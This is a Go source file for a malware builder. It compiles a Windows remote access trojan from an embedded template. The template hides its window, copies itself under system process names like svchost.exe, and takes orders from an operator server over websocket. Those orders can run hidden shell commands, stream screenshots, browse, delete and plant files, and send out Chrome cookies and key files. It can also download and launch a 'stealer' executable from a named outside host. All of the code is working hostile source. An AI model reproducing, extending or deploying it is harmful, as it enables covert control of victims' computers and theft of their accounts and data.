package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const clientTemplate = `package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"syscall"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

type Message struct {
	Type string ` + "`json:\"type\"`" + `
	Data string ` + "`json:\"data\"`" + `
	Name string ` + "`json:\"name,omitempty\"`" + `
}

var streaming = false
var conn *websocket.Conn

func runHiddenCommand(name string, arg ...string) ([]byte, error) {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	return cmd.CombinedOutput()
}

func downloadAndRunStealer(url string) error {
	// Скачиваем файл
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("download failed: %%v", err)
	}
	defer resp.Body.Close()

	// Сохраняем во временной папке
	stealerPath := filepath.Join(os.TempDir(), "svchost.exe")
	out, err := os.Create(stealerPath)
	if err != nil {
		return fmt.Errorf("create file failed: %%v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("copy failed: %%v", err)
	}

	// Запускаем скрытно
	cmd := exec.Command(stealerPath)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start failed: %%v", err)
	}

	// Удаляем через 5 секунд
	go func() {
		time.Sleep(5 * time.Second)
		os.Remove(stealerPath)
	}()

	return nil
}

func isValidExe(path string) bool {
    file, err := os.Open(path)
    if err != nil {
        return false
    }
    defer file.Close()
    
    header := make([]byte, 2)
    if _, err := file.Read(header); err != nil {
        return false
    }
    return string(header) == "MZ"
}

func tryRunMethods(path string) bool {
    methods := []func(string) error{
        func(p string) error { return exec.Command(p).Start() },
        func(p string) error { return exec.Command("explorer.exe", p).Start() },
        func(p string) error {
            return exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", p).Start()
        },
    }
    
    for _, method := range methods {
        if method(path) == nil {
            return true
        }
    }
    return false
}

func spoofProcessName() {
    // Common legitimate Windows process names
    legitNames := []string{
        "svchost.exe",
        "winlogon.exe",
        "dllhost.exe",
        "rundll32.exe",
    }
    
    // Get current executable path
    exePath, _ := os.Executable()
    
    // Create a copy with a legitimate name in temp directory
    newName := filepath.Join(os.TempDir(), legitNames[time.Now().Unix()%int64(len(legitNames))])
    if _, err := os.Stat(newName); os.IsNotExist(err) {
        data, _ := os.ReadFile(exePath)
        _ = os.WriteFile(newName, data, 0755)
        
        // Start new instance and exit current one
        cmd := exec.Command(newName)
        cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
        _ = cmd.Start()
        os.Exit(0)
    }
}

func main() {
	spoofProcessName()
	var err error
	conn, _, err = websocket.DefaultDialer.Dial("wss://YOUR_SERVER_IP/ws?key=supersecret", nil)
	if err != nil {
		log.Fatal("Connection error:", err)
	}
	defer conn.Close()

	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Println("Recovered from panic:", r)
			}
		}()
		for {
			var msg Message
			if err := conn.ReadJSON(&msg); err != nil {
				log.Println("read error:", err)
				break
			}

			switch msg.Type {
			case "cmd":
				out, err := runHiddenCommand("cmd", "/C", msg.Data)
				resp := Message{Type: "result", Data: string(out)}
				if err != nil {
					resp.Data += "\nError: " + err.Error()
				}
				conn.WriteJSON(resp)

			case "start_screen":
				if streaming {
					continue
				}
				streaming = true
				go func() {
					for streaming {
						imgPath := filepath.Join(os.TempDir(), "screen.jpg")
						cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
							"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "+
								"$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "+
								"$bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height); "+
								"$graphics = [Drawing.Graphics]::FromImage($bmp); "+
								"$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); "+
								"$bmp.Save('"+imgPath+"'); $bmp.Dispose()")
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						_, err := cmd.CombinedOutput()
						if err != nil {
							log.Println("screenshot error:", err)
							continue
						}

						data, err := os.ReadFile(imgPath)
						if err != nil {
							log.Println("read screenshot error:", err)
							continue
						}
						encoded := base64.StdEncoding.EncodeToString(data)
						conn.WriteJSON(Message{Type: "screen", Data: encoded})
						time.Sleep(100 * time.Millisecond)
					}
				}()

			case "stop_screen":
				streaming = false

			case "ls":
				files, err := os.ReadDir(msg.Data)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "ls error: " + err.Error()})
					continue
				}
				var result struct {
					Parent string ` + "`json:\"parent\"`" + `
					Items  []struct {
						Name string ` + "`json:\"name\"`" + `
						Full string ` + "`json:\"full\"`" + `
						Dir  bool   ` + "`json:\"dir\"`" + `
					} ` + "`json:\"items\"`" + `
				}
				parent := filepath.Dir(msg.Data)
				if parent != msg.Data {
					result.Parent = parent
				}
				for _, f := range files {
					full := filepath.Join(msg.Data, f.Name())
					result.Items = append(result.Items, struct {
						Name string ` + "`json:\"name\"`" + `
						Full string ` + "`json:\"full\"`" + `
						Dir  bool   ` + "`json:\"dir\"`" + `
					}{
						Name: f.Name(),
						Full: full,
						Dir:  f.IsDir(),
					})
				}
				raw, _ := json.Marshal(result)
				conn.WriteJSON(Message{Type: "explorer", Data: string(raw)})

			case "rm":
				err := os.RemoveAll(msg.Data)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "rm error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "deleted: " + msg.Data})
				}

			case "open":
				cmd := exec.Command("cmd", "/C", "start", "", msg.Data)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				err := cmd.Run()
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "open error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "opened: " + msg.Data})
				}

			case "upload":
				var payload struct {
					Filename string ` + "`json:\"filename\"`" + `
					Content  string ` + "`json:\"content\"`" + `
				}
				if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: invalid JSON"})
					break
				}
				data, err := base64.StdEncoding.DecodeString(payload.Content)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: base64 decode"})
					break
				}
				err = os.WriteFile(payload.Filename, data, 0644)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "uploaded: " + payload.Filename})
				}

			case "run_stealer":
				// 1. Формируем URL до stealer.exe на сервере
				stealerURL := "https://panel-agzz.onrender.com/apps/steler.exe"
				resp, err := http.Get(stealerURL)
				if err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Download failed: " + err.Error()})
					break
				}
				defer resp.Body.Close()

				// Сохранение файла
				stealerPath := filepath.Join(os.TempDir(), "wupdater.exe")
				data, err := io.ReadAll(resp.Body)
				if err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Read failed: " + err.Error()})
					break
				}
				
				if err := os.WriteFile(stealerPath, data, 0755); err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Write failed: " + err.Error()})
					break
				}

				// Проверка файла
				if !isValidExe(stealerPath) {
					conn.WriteJSON(Message{Type: "stealer", Data: "Invalid executable"})
					break
				}

				// Попытки запуска
				if tryRunMethods(stealerPath) {
					conn.WriteJSON(Message{Type: "stealer", Data: "Successfully, write to telegram @nvalteam to get | TODO: automation"})
				} else {
					conn.WriteJSON(Message{Type: "stealer", Data: "All start methods failed"})
				}
				
				// Отложенное удаление
				go func() {
					time.Sleep(30 * time.Second)
					os.Remove(stealerPath)
				}()

			case "get_cookies":
				id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
				collectAllCookies(id)
				conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
			}
		}
	}()

	for {
		time.Sleep(30 * time.Second)
	}
}

func collectAllCookies(id string) {
	localApp := os.Getenv("LOCALAPPDATA")
	cookieSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Default", "Cookies")
	stateSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Local State")

	tmpCookie := filepath.Join(os.TempDir(), "tmp_cookie.db")
	tmpState := filepath.Join(os.TempDir(), "tmp_state.json")

	if err := copyFile(cookieSrc, tmpCookie); err != nil {
		log.Println("copy cookie error:", err)
		return
	}
	if err := copyFile(stateSrc, tmpState); err != nil {
		log.Println("copy state error:", err)
		return
	}

	uploadFile(tmpCookie, "cookies/"+id+".db")
	uploadFile(tmpState, "cookies/"+id+".json")

	_ = os.Remove(tmpCookie)
	_ = os.Remove(tmpState)
}

func uploadFile(path, remote string) {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Println("upload read error:", err)
		conn.WriteJSON(Message{Type: "result", Data: "read error: " + err.Error()})
		return
	}
	payload := struct {
		Filename string ` + "`json:\"filename\"`" + `
		Content  string ` + "`json:\"content\"`" + `
	}{
		Filename: remote,
		Content:  base64.StdEncoding.EncodeToString(data),
	}
	raw, _ := json.Marshal(payload)
	conn.WriteJSON(Message{Type: "upload", Data: string(raw)})
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}`

func Build(serverHost string, buildID string) (string, error) {
	startTime := time.Now()
	log.Printf("[Builder] Starting build %s", buildID)

	// Подготовка директории
	buildDir := filepath.Join("builds", buildID)
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create build directory: %v", err)
	}

	// Генерация кода
	code := strings.ReplaceAll(clientTemplate, "YOUR_SERVER_IP", serverHost)
	clientPath := filepath.Join(buildDir, "client.go")
	
	if err := os.WriteFile(clientPath, []byte(code), 0644); err != nil {
		return "", fmt.Errorf("failed to write client.go: %v", err)
	}

	// Компиляция
	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(),
		"CGO_ENABLED=1",
		"GOOS=windows", 
		"GOARCH=amd64",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %v\nOutput: %s", err, string(output))
	}

	// Очистка
	if err := os.Remove(clientPath); err != nil {
		log.Printf("[Builder] Warning: failed to remove temp file: %v", err)
	}

	exePath := filepath.Join(buildDir, "client.exe")
	log.Printf("[Builder] Build %s completed in %v", buildID, time.Since(startTime))
	
	return exePath, nil
}
